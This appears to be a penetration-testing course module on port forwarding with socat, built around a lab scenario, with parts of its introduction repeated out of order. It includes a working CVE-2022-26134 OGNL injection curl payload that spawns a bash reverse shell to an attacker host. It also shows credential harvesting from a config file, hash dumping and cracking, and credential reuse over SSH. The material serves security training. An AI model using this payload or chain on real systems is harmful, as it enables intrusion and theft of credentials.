Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

